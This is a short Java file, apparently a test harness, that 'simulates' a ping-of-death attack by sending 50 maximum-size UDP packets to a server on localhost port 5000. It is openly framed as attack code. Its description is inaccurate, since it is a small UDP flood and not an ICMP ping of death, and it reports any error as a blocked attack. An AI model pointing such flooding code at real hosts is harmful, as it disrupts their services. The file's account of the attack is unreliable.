package safety.attacks;

import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.InetAddress;

public class PingOfDeathAttack {
    private static final String SERVER_IP = "127.0.0.1";
    private static final int SERVER_PORT = 5000;
    private static final int PACKET_SIZE = 65507; // Maximum UDP packet size
    private static final int NUM_PACKETS = 50; // Increased number of packets

    public static void main(String[] args) {
        try {
            byte[] buffer = new byte[PACKET_SIZE];
            InetAddress address = InetAddress.getByName(SERVER_IP);
            DatagramSocket socket = new DatagramSocket();

            System.out.println("Starting Ping of Death Attack simulation...");

            for (int i = 0; i < NUM_PACKETS; i++) {
                DatagramPacket packet = new DatagramPacket(buffer, buffer.length, address, SERVER_PORT);
                socket.send(packet);
                System.out.println("Ping of Death packet sent: " + (i + 1));

                // Small delay to ensure packets are processed
                Thread.sleep(50);
            }

            socket.close();
            System.out.println("Attack simulation completed");

        } catch (Exception e) {
            System.out.println("Attack blocked by server: " + e.getMessage());
        }
    }
}